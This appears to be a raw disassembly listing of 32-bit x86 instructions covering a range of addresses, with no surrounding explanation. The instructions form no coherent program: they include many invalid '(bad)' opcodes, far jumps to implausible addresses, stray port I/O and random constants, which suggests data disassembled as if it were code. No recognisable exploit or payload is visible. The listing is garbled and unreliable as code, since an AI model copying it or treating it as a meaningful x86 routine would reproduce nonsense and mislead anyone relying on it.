  42e6f4:	sbb    bl,BYTE PTR [edi+0x78]
  42e6f7:	push   0x67
  42e6f9:	fimul  DWORD PTR [ebp*4+0x7f4bd338]
  42e700:	popf   
  42e701:	bnd jbe 0x42e742
  42e704:	sti    
  42e705:	sub    eax,0x3b5b294c
  42e70a:	inc    esi
  42e70b:	push   ss
  42e70c:	test   eax,0x9e96b949
  42e711:	lds    ebx,FWORD PTR [edi-0x7]
  42e714:	lods   eax,DWORD PTR ds:[esi]
  42e715:	xlat   BYTE PTR ds:[ebx]
  42e716:	cmp    DWORD PTR [edx-0x49],edx
  42e719:	fimul  WORD PTR [edx-0x48d29d85]
  42e71f:	lods   al,BYTE PTR ds:[esi]
  42e720:	scas   eax,DWORD PTR es:[edi]
  42e721:	lock pop ecx
  42e723:	xor    al,0x6f
  42e725:	sbb    bh,BYTE PTR [edi+edx*8+0x7bd063db]
  42e72c:	sbb    ebp,DWORD PTR [edx+eiz*8-0x24ad2083]
  42e733:	in     eax,dx
  42e734:	lahf   
  42e735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e736:	mov    esi,0x406f1f73
  42e73b:	pop    esp
  42e73c:	cmp    al,0xf7
  42e73e:	dec    esi
  42e73f:	xor    bl,BYTE PTR [ebp+0x0]
	...
  42e7b2:	add    BYTE PTR [eax],al
  42e7b4:	xchg   esi,eax
  42e7b5:	fwait
  42e7b6:	cwde   
  42e7b7:	pop    edi
  42e7b8:	popf   
  42e7b9:	pop    edi
  42e7ba:	xlat   BYTE PTR ds:[ebx]
  42e7bb:	fisttp DWORD PTR [esi+0x230d5576]
  42e7c1:	loopne 0x42e7d9
  42e7c3:	jno    0x42e796
  42e7c5:	jmp    0x0:0xf50001
  42e7cc:	cli    
  42e7cd:	js     0x42e826
  42e7cf:	or     eax,0xfb92e0c1
  42e7d4:	repnz mov ah,0x63
  42e7d7:	fidivr DWORD PTR [edi]
  42e7d9:	(bad)  
  42e7da:	daa    
  42e7db:	adc    al,0xc9
  42e7dd:	imul   edi,DWORD PTR ds:0x2365a335,0x3b
  42e7e4:	sub    cl,BYTE PTR [edx-0x36]
  42e7e7:	fild   DWORD PTR [eax+esi*8+0xc]
  42e7eb:	(bad)  
  42e7ec:	cmc    
  42e7ed:	in     al,dx
  42e7ee:	adc    bl,BYTE PTR [eax-0x19271e2e]
  42e7f4:	scas   eax,DWORD PTR es:[edi]
  42e7f5:	in     eax,0x46
  42e7f7:	mov    BYTE PTR [edx],dl
  42e7f9:	mov    dl,0x3f
  42e7fb:	mov    al,ds:0xbce21c7d
  42e800:	pop    eax
  42e801:	mov    edx,DWORD PTR [ebx-0x43]
  42e804:	ins    DWORD PTR es:[edi],dx
  42e805:	stc    
  42e806:	bswap  esi
  42e808:	cdq    
  42e809:	xor    ah,bl
  42e80b:	mov    cl,0xab
  42e80d:	jecxz  0x42e7ef
  42e80f:	sub    al,0x46
  42e811:	mov    al,0xf8
  42e813:	and    bl,dl
  42e815:	out    dx,eax
  42e816:	adc    esi,DWORD PTR [ebp+0x4b658230]
  42e81c:	cmp    BYTE PTR ds:0x72e48007,bl
  42e822:	mov    ebp,0xfae0a4ec
  42e827:	icebp  
  42e828:	std    
  42e829:	xchg   edx,eax
  42e82a:	cli    
  42e82b:	ret    
  42e82c:	cmp    DWORD PTR [edi],edi
  42e82e:	inc    esi
  42e82f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e830:	aad    0x6a
  42e832:	xlat   BYTE PTR ds:[ebx]
  42e833:	ins    BYTE PTR es:[edi],dx
  42e834:	mov    ebp,0x39a3a786
  42e839:	lods   al,BYTE PTR cs:[esi]
  42e83b:	mov    BYTE PTR [edi-0xb],dl
  42e83e:	and    eax,0xee3e7c4c
  42e843:	push   0xe562dcc
  42e848:	mov    cl,0xd6
  42e84a:	xor    bl,BYTE PTR [edi]
  42e84c:	jmp    0x42e8a1
  42e84e:	xor    DWORD PTR [ecx-0x2267c36b],0x4f
  42e855:	inc    edi
  42e856:	out    dx,eax
  42e857:	cli    
  42e858:	jmp    0x7b10587c
  42e85d:	(bad)  
  42e85f:	sbb    dl,BYTE PTR [ebx+edx*4+0x688fd158]
  42e866:	cmp    bh,BYTE PTR [edx+0x519e782e]
  42e86c:	xchg   esp,eax
  42e86d:	div    DWORD PTR [esi+edx*8+0x53]
  42e871:	xchg   ecx,eax
  42e872:	adc    edx,esi
  42e874:	push   ecx
  42e875:	pop    ds
  42e876:	scas   eax,DWORD PTR es:[edi]
  42e877:	loopne 0x42e8cf
  42e879:	jbe    0x42e82d
  42e87b:	xor    al,0x49
  42e87d:	push   ecx
  42e87e:	ret    0x61d3
  42e881:	test   al,0xfb
  42e883:	inc    ebx
  42e884:	mov    ds:0x5d738c13,eax
  42e889:	pop    ebp
  42e88a:	xor    al,0x2
  42e88c:	jo     0x42e870
  42e88e:	xchg   cl,al
  42e890:	mov    al,ds:0x89218741
  42e895:	dec    eax
  42e896:	cmp    al,0x6f
  42e898:	lods   al,BYTE PTR ds:[esi]
  42e899:	push   ebp
  42e89a:	int    0x93
  42e89c:	fadd   QWORD PTR ds:0x202c1871
  42e8a2:	lods   eax,DWORD PTR ds:[esi]
  42e8a3:	xor    eax,0xa0af3eca
  42e8a8:	int3   
  42e8a9:	cmp    al,0x93
  42e8ab:	mov    edi,DWORD PTR [edx+0x29]
  42e8ae:	ins    BYTE PTR es:[edi],dx
  42e8af:	fadd   QWORD PTR [esi+0x51]
  42e8b2:	cli    
  42e8b3:	mov    dh,0xb8
  42e8b5:	push   0xce66d085
  42e8ba:	and    BYTE PTR [edx-0x76444b39],cl
  42e8c0:	fild   DWORD PTR [eax]
	...
  42e932:	add    BYTE PTR [eax],al
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x54
  42e941:	ret    
  42e942:	hlt    
  42e943:	hlt    
  42e944:	(bad)  
  42e945:	jmp    0x42e948
  42e947:	add    ch,dh
  42e949:	add    BYTE PTR [eax],al
  42e94b:	add    BYTE PTR [esi-0x7d],cl
  42e94e:	pop    edx
  42e94f:	inc    esp
  42e950:	sbb    ch,BYTE PTR [edi]
  42e952:	xchg   edi,eax
  42e953:	mov    BYTE PTR [eax-0x6b0b7363],al
  42e959:	sub    al,0xb2
  42e95b:	popa   
  42e95c:	(bad)  
  42e95d:	(bad)  
  42e95f:	test   al,0x4a
  42e961:	aaa    
  42e962:	mov    al,ds:0x990bb7f5
  42e967:	cmp    al,0xbd
  42e969:	out    0xd0,al
  42e96b:	push   cs
  42e96c:	imul   BYTE PTR [ebp-0x26]
  42e96f:	xchg   edi,eax
  42e970:	ret    
  42e971:	add    ch,BYTE PTR [esi-0x2a]
  42e974:	push   edi
  42e975:	ficom  WORD PTR [ecx]
  42e977:	push   0x7c0fbec6
  42e97c:	dec    ebx
  42e97d:	dec    esp
  42e97e:	retf   0xddbe
  42e981:	lods   al,BYTE PTR ds:[esi]
  42e982:	sar    BYTE PTR [ebx-0x17ae4576],0xde
  42e989:	retf   
  42e98a:	jae    0x42e95f
  42e98c:	dec    ebx
  42e98d:	push   ecx
  42e98e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e98f:	jp     0x42e99b
  42e991:	lahf   
  42e992:	dec    eax
  42e993:	mov    ah,0x3d
  42e995:	push   esi
  42e996:	xor    al,0x73
  42e998:	push   0x7a
  42e99a:	or     al,0x34
  42e99c:	mov    WORD PTR [ebp-0x12],ds
  42e99f:	pop    esi
  42e9a0:	fnstcw WORD PTR [esi]
  42e9a2:	adc    ah,bh
  42e9a4:	test   BYTE PTR [edx-0x38],dl
  42e9a7:	cmp    eax,0x6a0aa1a0
  42e9ac:	mov    ecx,0xa529077e
  42e9b1:	mov    ch,0x62
  42e9b3:	mov    edi,DWORD PTR [ebp-0x47cc6024]
  42e9b9:	loopne 0x42e975
  42e9bb:	das    
  42e9bc:	adc    eax,0x400e7c2a
  42e9c1:	inc    ecx
  42e9c2:	mov    al,0x4
  42e9c4:	adc    eax,0xde22cac8
  42e9c9:	pop    ebp
  42e9ca:	cmp    edi,ebx
  42e9cc:	mov    ds:0x3d2b944c,al
  42e9d1:	imul   BYTE PTR [edi+0x3d13f4f3]
  42e9d7:	sub    cl,ah
  42e9d9:	not    DWORD PTR [esi+0x641b7953]
  42e9df:	enter  0x681f,0x65
  42e9e3:	cmp    ebp,DWORD PTR [edx+0x238bd4c3]
  42e9e9:	push   eax
  42e9ea:	in     al,dx
  42e9eb:	outs   dx,BYTE PTR ds:[esi]
  42e9ec:	loope  0x42ea25
  42e9ee:	inc    esi
  42e9ef:	sbb    BYTE PTR [edi+0x49],al
  42e9f2:	int3   
  42e9f3:	xor    eax,0x2addf9ff
  42e9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9f9:	je     0x42e9ec
  42e9fb:	cdq    
  42e9fc:	and    dl,bl
  42e9fe:	add    al,ch
  42ea00:	dec    edx
  42ea01:	lahf   
  42ea02:	mov    edx,0x1d4aafba
  42ea07:	cmp    BYTE PTR [ecx+0x60],al
  42ea0a:	(bad)  
  42ea0c:	xchg   esi,eax
  42ea0d:	test   eax,0xfe805963
  42ea12:	dec    esp
  42ea13:	cmp    bl,BYTE PTR [eax+0x49]
  42ea16:	mov    ch,0x20
  42ea18:	fdiv   st,st(4)
  42ea1a:	inc    ebp
  42ea1b:	push   0xef67177e
  42ea20:	cmp    dl,bh
  42ea22:	jae    0x42e9cd
  42ea24:	in     al,0x7b
  42ea26:	cmp    eax,0x472ee864
  42ea2b:	or     DWORD PTR es:[eax],esi
  42ea2e:	or     bh,cl
  42ea30:	mov    eax,ds:0x9687a109
  42ea35:	or     eax,0xbd45ab53
  42ea3a:	jno    0x42e9c8
  42ea3c:	sub    eax,0xdd863622
	...
  42eab1:	add    BYTE PTR [eax],al
  42eab3:	add    BYTE PTR [eax-0x2093e086],dh
  42eab9:	ins    DWORD PTR es:[edi],dx
  42eaba:	repz dec BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	out    dx,eax
  42eac1:	test   BYTE PTR [ecx],al
  42eac3:	(bad)  
  42eac4:	mov    ebx,0xf50001ec
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    BYTE PTR [esi+eiz*2+0x77],ch
  42eacf:	jp     0x42eac3
  42ead1:	mov    cl,BYTE PTR [edi+0x20f3ede4]
  42ead7:	fwait
  42ead8:	xchg   ecx,eax
  42ead9:	es xchg edx,eax
  42eadb:	out    dx,eax
  42eadc:	lea    esi,[ebx+0x71891073]
  42eae2:	jmp    0xf07fba4f
  42eae7:	ins    DWORD PTR es:[edi],dx
  42eae8:	and    cl,bh
  42eaea:	mov    eax,ds:0xd5f4d410
  42eaef:	aas    
  42eaf0:	unpcklps xmm1,XMMWORD PTR [esi]
  42eaf3:	(bad)  
  42eaf4:	adc    al,0x88
  42eaf6:	ins    DWORD PTR es:[edi],dx
  42eaf7:	or     BYTE PTR [edi],bl
  42eaf9:	push   ss
  42eafa:	mov    edi,0xb170cfb0
  42eaff:	adc    eax,0xfa09934b
  42eb04:	xchg   edx,eax
  42eb05:	mov    eax,ds:0xaa19e523
  42eb0a:	xor    al,BYTE PTR [ebp-0x1579da2c]
  42eb10:	into   
  42eb11:	stos   BYTE PTR es:[edi],al
  42eb12:	jne    0x42eb7f
  42eb14:	loopne 0x42eadc
  42eb16:	ins    DWORD PTR es:[edi],dx
  42eb17:	and    BYTE PTR [edi+0x71],al
  42eb1a:	xchg   edx,eax
  42eb1b:	mov    dl,0x82
  42eb1d:	and    dl,BYTE PTR [eax-0x2c]
  42eb20:	push   ds
  42eb21:	repz test BYTE PTR [ebx-0x1e],ah
  42eb25:	inc    ecx
  42eb26:	xchg   esp,eax
  42eb27:	jmp    0x58db:0xb94335bf
  42eb2e:	or     eax,DWORD PTR [edx]
  42eb30:	frstor [eax+0x11f5d03c]
  42eb36:	push   ebp
  42eb37:	imul   esp,esp,0x8155ef3d
  42eb3d:	test   DWORD PTR [esi+0x40c08dd3],esi
  42eb43:	arpl   bx,bp
  42eb45:	stos   DWORD PTR es:[edi],eax
  42eb46:	(bad)  
  42eb47:	pop    edx
  42eb48:	pushf  
  42eb49:	aaa    
  42eb4a:	adc    eax,0x34885cac
  42eb4f:	outs   dx,DWORD PTR ds:[esi]
  42eb50:	pop    edx
  42eb51:	mov    dh,0x34
  42eb53:	fdiv   DWORD PTR [ebx+0x3d162063]
  42eb59:	push   esp
  42eb5a:	dec    ebp
  42eb5b:	mov    bh,0xe2
  42eb5d:	call   0x83e5:0x97834b07
  42eb64:	mov    ah,0x92
  42eb66:	sub    BYTE PTR [esi+0x3a],ch
  42eb69:	bound  eax,QWORD PTR [esi]
  42eb6b:	stos   DWORD PTR es:[edi],eax
  42eb6c:	push   0x38
  42eb6e:	ds jo  0x42eb99
  42eb71:	inc    ebp
  42eb72:	and    BYTE PTR [edx-0x36fa0675],ch
  42eb78:	and    bl,BYTE PTR [ebp+0xb]
  42eb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb7c:	imul   ebp,DWORD PTR [edx-0xacace2f]
  42eb83:	pop    esi
  42eb84:	inc    ecx
  42eb85:	and    al,0xc6
  42eb87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb88:	int    0xa9
  42eb8a:	dec    eax
  42eb8b:	dec    ebp
  42eb8c:	rcl    DWORD PTR [edi-0x15fc0831],0x9b
  42eb93:	sti    
  42eb94:	movups xmm6,XMMWORD PTR [ebx+0x63ab0bd8]
  42eb9b:	repnz push edx
  42eb9d:	cs (bad) 
  42eb9f:	(bad)  
  42eba0:	lods   al,BYTE PTR ds:[esi]
  42eba1:	ja     0x42ebf1
  42eba3:	or     BYTE PTR [esi],dl
  42eba5:	sbb    al,0x72
  42eba7:	sub    bl,BYTE PTR [esp+edi*1-0x2b4206da]
  42ebae:	jno    0x42ebc6
  42ebb0:	mov    al,0x3f
  42ebb2:	out    dx,eax
  42ebb3:	xor    BYTE PTR [ebp+esi*2-0xf],dh
  42ebb7:	les    ebx,FWORD PTR [eax]
  42ebb9:	pushf  
  42ebba:	mov    DWORD PTR ds:0x8447ba76,esp
  42ebc0:	mov    bh,0x0
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4-0x232e1f97]
  42ec43:	cmp    DWORD PTR [eax-0xafffe13],esi
  42ec49:	add    BYTE PTR [eax],al
  42ec4b:	add    BYTE PTR [esi+ebp*1+0x53ebd86e],cl
  42ec52:	mov    cl,0xaf
  42ec54:	fld    TBYTE PTR [edx-0x111945bd]
  42ec5a:	out    dx,eax
  42ec5b:	add    DWORD PTR ds:[edi],0xffffffdf
  42ec5f:	(bad)  
  42ec60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec61:	jo     0x42ec16
  42ec63:	cmp    BYTE PTR [esi-0x20fa45cd],0xfa
  42ec6a:	mov    bh,0x67
  42ec6c:	popf   
  42ec6d:	and    BYTE PTR [esi+0x5121cd0e],ah
  42ec73:	and    ch,BYTE PTR [ebx]
  42ec75:	fsub   DWORD PTR [edx+eiz*1]
  42ec78:	out    0x93,al
  42ec7a:	rol    DWORD PTR [ebp+0xfdc9c56],cl
  42ec80:	push   esi
  42ec81:	jnp    0x42ec3f
  42ec83:	(bad)  
  42ec84:	shl    DWORD PTR [ebx+0x31680a36],1
  42ec8a:	vpaddsb ymm0,ymm5,ymm0
  42ec8e:	xchg   ebx,eax
  42ec8f:	adc    al,0x5c
  42ec91:	and    ebp,edx
  42ec93:	test   al,0xa2
  42ec95:	in     eax,dx
  42ec96:	mov    esi,0x75aa726b
  42ec9b:	pop    eax
  42ec9c:	test   al,0xf9
  42ec9e:	push   0xfd5829e3
  42eca3:	mov    ch,0x20
  42eca5:	fbld   TBYTE PTR [edi]
  42eca7:	mov    al,ds:0xacc783b7
  42ecac:	fld    st(2)
  42ecae:	cs out 0x65,eax
  42ecb1:	adc    DWORD PTR [ebx-0x1e],eax
  42ecb4:	aas    
  42ecb5:	xchg   ecx,eax
  42ecb6:	pop    ecx
  42ecb7:	dec    ecx
  42ecb8:	and    BYTE PTR [ebx],ch
  42ecba:	dec    edx
  42ecbb:	dec    esi
  42ecbc:	bound  edx,QWORD PTR [ebx+0x26a6049f]
  42ecc2:	xchg   esi,eax
  42ecc3:	mov    bl,0x71
  42ecc5:	ret    0x6050
  42ecc8:	mov    ebp,0xcf71d576
  42eccd:	dec    eax
  42ecce:	arpl   WORD PTR [ecx],dx
  42ecd0:	xor    DWORD PTR [ecx-0x2],ecx
  42ecd3:	out    dx,eax
  42ecd4:	dec    edx
  42ecd5:	retf   
  42ecd6:	mov    DWORD PTR [esi-0x5f],eax
  42ecd9:	cmp    eax,0xc39cbd0d
  42ecde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecdf:	std    
  42ece0:	xor    al,0x93
  42ece2:	ja     0x42ece9
  42ece4:	sub    DWORD PTR [ecx],esi
  42ece6:	(bad)  
  42ece7:	jnp    0x42ec9a
  42ece9:	je     0x42ecf2
  42eceb:	je     0x42ece7
  42eced:	(bad)  
  42ecee:	xchg   edi,eax
  42ecef:	mov    eax,ds:0xd59d06c5
  42ecf4:	push   ss
  42ecf5:	adc    eax,ebp
  42ecf7:	xchg   DWORD PTR [esi-0x8],esp
  42ecfa:	pop    edx
  42ecfb:	dec    eax
  42ecfc:	mov    ebx,0x7be2a9a4
  42ed01:	shr    esi,0xd
  42ed04:	rcr    BYTE PTR ss:[ecx+0x16f5e942],1
  42ed0b:	jle    0x42ec9d
  42ed0d:	enter  0xc5c3,0xca
  42ed11:	bound  eax,QWORD PTR [ebx+0x4723ae20]
  42ed17:	cmp    ebx,esp
  42ed19:	bound  cx,DWORD PTR [edi+ebp*1+0x57d0e5c5]
  42ed21:	mov    bh,BYTE PTR [edx+0x55f5cf38]
  42ed27:	xor    al,0x1f
  42ed29:	arpl   sp,bx
  42ed2b:	push   esi
  42ed2c:	add    BYTE PTR [edx-0x13ccfaf8],ah
  42ed32:	out    0x2b,eax
  42ed34:	dec    ebx
  42ed35:	xor    al,0x88
  42ed37:	jl     0x42ecba
  42ed39:	ja     0x42edac
  42ed3b:	push   es
  42ed3c:	mov    DWORD PTR [eax+eiz*1+0x62],ecx
  42ed40:	pop    ebx
	...
  42edb1:	add    BYTE PTR [eax],al
  42edb3:	add    dh,ah
  42edb5:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0xfe24595d
  42edc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edc5:	out    dx,al
  42edc6:	add    DWORD PTR [eax],eax
  42edc8:	cmc    
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [edx-0x7e],ch
  42edce:	les    esp,FWORD PTR [ebx]
  42edd0:	in     eax,0x49
  42edd2:	retf   
  42edd3:	out    0x60,eax
  42edd5:	add    al,0x59
  42edd7:	loope  0x42ed8f
  42edd9:	cli    
  42edda:	hlt    
  42eddb:	inc    eax
  42eddc:	xchg   DWORD PTR [eax-0x72e665d8],ebp
  42ede2:	pushf  
  42ede3:	lea    ebp,[edi+0x31]
  42ede6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ede7:	fdivp  st(2),st
  42ede9:	out    0x69,eax
  42edeb:	jge    0x42ed84
  42eded:	sbb    eax,0x422dfa55
  42edf2:	add    edx,DWORD PTR [ecx-0x6d]
  42edf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42edf6:	lock scas al,BYTE PTR es:[edi]
  42edf8:	sub    eax,0xd7e8b00d
  42edfd:	mov    bl,0x2f
  42edff:	dec    ebx
  42ee00:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee02:	sti    
  42ee03:	xchg   ebx,eax
  42ee04:	sti    
  42ee05:	fbstp  TBYTE PTR [edi-0x11c2ef69]
  42ee0b:	jl     0x42ed92
  42ee0d:	loope  0x42ee7e
  42ee0f:	dec    ebp
  42ee10:	scas   eax,DWORD PTR es:[edi]
  42ee11:	fnsave [esi+0x5ef7e822]
  42ee17:	push   0x25
  42ee19:	mov    cl,0xad
  42ee1b:	inc    edi
  42ee1c:	pop    fs
  42ee1e:	push   ecx
  42ee1f:	or     DWORD PTR [edi+0x72],edi
  42ee22:	imul   ch
  42ee24:	push   ds
  42ee25:	out    0x18,al
  42ee27:	stos   DWORD PTR es:[edi],eax
  42ee28:	or     eax,0x37af121
  42ee2d:	pop    ebx
  42ee2e:	mov    ah,0x36
  42ee30:	sbb    al,0xe1
  42ee32:	mov    al,ds:0x841f60f8
  42ee37:	pop    ecx
  42ee38:	je     0x42edcc
  42ee3a:	pop    ebp
  42ee3b:	cli    
  42ee3c:	ins    BYTE PTR es:[edi],dx
  42ee3d:	leave  
  42ee3e:	xchg   ecx,eax
  42ee3f:	adc    BYTE PTR [esi],cl
  42ee41:	xor    edi,DWORD PTR [esi+0x12]
  42ee44:	pop    ds
  42ee45:	adc    al,0x2a
  42ee47:	or     eax,0x220277e
  42ee4c:	sti    
  42ee4d:	stc    
  42ee4e:	cwde   
  42ee4f:	iret   
  42ee50:	mov    BYTE PTR [ebp+0x2e2b8085],dh
  42ee56:	push   ss
  42ee57:	push   ebp
  42ee58:	sub    eax,0x801df93d
  42ee5d:	pop    ss
  42ee5e:	iret   
  42ee5f:	scas   eax,DWORD PTR es:[edi]
  42ee60:	xchg   edi,eax
  42ee61:	repnz aas 
  42ee63:	pusha  
  42ee64:	adc    al,0x70
  42ee66:	adc    BYTE PTR [ebx+0x36111d01],dl
  42ee6c:	mov    al,BYTE PTR [ebp+ebp*1-0x78c54298]
  42ee73:	popf   
  42ee74:	and    bh,BYTE PTR [edi-0x60]
  42ee77:	pop    ds
  42ee78:	pop    esp
  42ee79:	mov    ebp,0xde8685e4
  42ee7e:	dec    esp
  42ee7f:	sbb    eax,0x13df621a
  42ee84:	jae    0x42eec9
  42ee86:	jge    0x42ee14
  42ee88:	push   esi
  42ee89:	hlt    
  42ee8a:	adc    DWORD PTR [esi+0x1d],edx
  42ee8d:	dec    edx
  42ee8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee8f:	inc    eax
  42ee90:	sbb    ebp,DWORD PTR [edx+ebx*1+0x430e6d53]
  42ee97:	(bad)  
  42ee98:	enter  0xb4c4,0xd4
  42ee9c:	rcl    BYTE PTR [edx+eax*1+0x3d486a33],1
  42eea3:	shr    BYTE PTR [edx-0x6d1ff558],cl
  42eea9:	pop    esp
  42eeaa:	bnd ja 0x42ee7d
  42eead:	rcl    BYTE PTR ds:[ebx+0x701a5175],1
  42eeb4:	leave  
  42eeb5:	rcl    ah,cl
  42eeb7:	mov    ch,0xf0
  42eeb9:	(bad)  
  42eebb:	pushf  
  42eebc:	adc    ebx,DWORD PTR [eax+0x7b]
  42eebf:	gs cli 
	...
  42ef31:	add    BYTE PTR [eax],al
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz add al,0x5d
  42ef42:	push   ss
  42ef43:	test   eax,0x1ef9a
  42ef48:	cmc    
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [ebp-0x7e],bl
  42ef4e:	xchg   ebp,eax
  42ef4f:	loope  0x42ef6a
  42ef51:	rcl    BYTE PTR [ebx+0x38],cl
  42ef54:	nop
  42ef55:	adc    BYTE PTR [ecx+0x33b3fe64],cl
  42ef5b:	pop    ebp
  42ef5c:	jb     0x42ef3e
  42ef5e:	mov    eax,0xf263880e
  42ef63:	xchg   edi,eax
  42ef64:	or     al,0xa7
  42ef66:	lock jae 0x42efb9
  42ef69:	mov    cl,0xa5
  42ef6b:	repz loop 0x42ef84
  42ef6e:	loope  0x42eef5
  42ef70:	pop    ebp
  42ef71:	sbb    DWORD PTR es:[ebx+0x6d116075],esp
  42ef78:	(bad)  
  42ef79:	sbb    al,0x72
  42ef7b:	sbb    ebx,DWORD PTR [ebp+0x436da059]
  42ef81:	loopne 0x42ef6a
  42ef83:	test   al,0x21
  42ef85:	in     al,dx
  42ef86:	shr    ebp,cl
  42ef88:	jnp    0x42efe5
  42ef8a:	xlat   BYTE PTR ds:[ebx]
  42ef8c:	or     ebx,DWORD PTR [edx]
  42ef8e:	out    0x1a,eax
  42ef90:	cld    
  42ef91:	pop    ebp
  42ef92:	ja     0x42eff4
  42ef94:	jbe    0x42efe9
  42ef96:	das    
  42ef97:	sbb    bl,BYTE PTR [esi+0x2fb3ba9c]
  42ef9d:	test   al,0xd1
  42ef9f:	stc    
  42efa0:	fidiv  WORD PTR [ebp+0x1fda2dc6]
  42efa6:	leave  
  42efa7:	xor    ah,cl
  42efa9:	or     BYTE PTR [edx+ebp*4],cl
  42efac:	test   al,0x13
  42efae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efaf:	jle    0x42ef8d
  42efb1:	cwde   
  42efb2:	pop    edx
  42efb3:	xchg   ebp,eax
  42efb4:	jecxz  0x42ef83
  42efb6:	sub    ebp,ecx
  42efb8:	add    ah,BYTE PTR [eax]
  42efba:	out    dx,al
  42efbb:	sahf   
  42efbc:	stos   DWORD PTR es:[edi],eax
  42efbd:	push   ebp
  42efbe:	push   ebp
  42efbf:	(bad)  
  42efc0:	jp     0x42efd7
  42efc2:	push   0x48
  42efc4:	sbb    al,ah
  42efc6:	or     ch,0x97
  42efc9:	ins    DWORD PTR es:[edi],dx
  42efca:	js     0x42efa2
  42efcc:	hlt    
  42efcd:	popa   
  42efce:	into   
  42efcf:	addr16 mov bl,0x5d
  42efd2:	mov    ecx,ebx
  42efd4:	ins    DWORD PTR es:[edi],dx
  42efd5:	inc    ebx
  42efd6:	xchg   ecx,eax
  42efd7:	fild   WORD PTR [edi+0x493f42a0]
  42efdd:	fdiv   st(4),st
  42efdf:	and    BYTE PTR [ebp+esi*8+0x39c56d48],dh
  42efe6:	(bad)  
  42efe7:	movhps QWORD PTR fs:[ebx+edx*1-0x6be7cdff],xmm4
  42eff0:	adc    BYTE PTR [esi+0x6b45e619],0xa4
  42eff7:	xor    ch,bl
  42eff9:	adc    BYTE PTR [eax+0x664c045e],al
  42efff:	hlt    
  42f000:	jo     0x42efd9
  42f002:	add    DWORD PTR [edx-0x44],0x9dc25625
  42f009:	pop    ds
  42f00a:	xor    dh,BYTE PTR [eax]
  42f00c:	inc    esp
  42f00d:	js     0x42f08b
  42f00f:	jecxz  0x42efc8
  42f011:	cs inc ebp
  42f013:	hlt    
  42f014:	bound  edi,QWORD PTR [esp+eax*1-0x761be696]
  42f01b:	sub    BYTE PTR [edx],bl
  42f01d:	pop    es
  42f01e:	das    
  42f01f:	outs   dx,BYTE PTR ds:[esi]
  42f020:	dec    ebx
  42f021:	jmp    0x613d97de
  42f026:	sub    esi,edx
  42f028:	test   al,0xc
  42f02a:	ret    
  42f02b:	ja     0x42f04c
  42f02d:	inc    esi
  42f02e:	mov    dl,0xfc
  42f030:	push   ecx
  42f031:	imul   ecx,DWORD PTR [eax+edi*4],0xffffff8c
  42f035:	mov    edi,DWORD PTR ds:0x5c32269e
  42f03b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f03c:	scas   eax,DWORD PTR es:[edi]
  42f03d:	out    0xd6,al
  42f03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f040:	ja     0x42f042
	...
  42f0b2:	add    BYTE PTR [eax],al
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  ecx,QWORD PTR [esi]
  42f0c1:	inc    ebx
  42f0c2:	ret    0x8f1b
  42f0c5:	lock add DWORD PTR [eax],eax
  42f0c8:	cmc    
  42f0c9:	add    BYTE PTR [eax],al
  42f0cb:	add    BYTE PTR [ebx+eax*1+0x7d04697f],dh
  42f0d2:	xchg   esp,eax
  42f0d3:	adc    esi,DWORD PTR [edi-0x44bbd2af]
  42f0d9:	out    0x80,eax
  42f0db:	add    ch,BYTE PTR [ecx+0x3c]
  42f0de:	bound  esi,QWORD PTR [edi+0x3f]
  42f0e1:	(bad)  
  42f0e2:	sub    bl,dh
  42f0e4:	cmc    
  42f0e5:	jbe    0x42f14d
  42f0e7:	outs   dx,BYTE PTR ds:[esi]
  42f0e8:	add    al,0xfd
  42f0ea:	lds    esp,FWORD PTR [edx-0x1]
  42f0ed:	out    0x5f,al
  42f0ef:	push   ebx
  42f0f0:	clc    
  42f0f1:	ror    BYTE PTR [edi+0x65131498],cl
  42f0f7:	mov    edx,0xd7fec373
  42f0fc:	xchg   ecx,eax
  42f0fd:	add    ebx,DWORD PTR [ecx+0x6e]
  42f100:	inc    ecx
  42f101:	push   eax
  42f102:	pop    edx
  42f104:	int    0xe1
  42f106:	retf   
  42f107:	and    eax,0xccd69092
  42f10c:	ror    DWORD PTR [esi-0x58],cl
  42f10f:	pop    ebx
  42f110:	xor    BYTE PTR [eax-0x50f5373b],0x76
  42f117:	mov    bl,0x8a
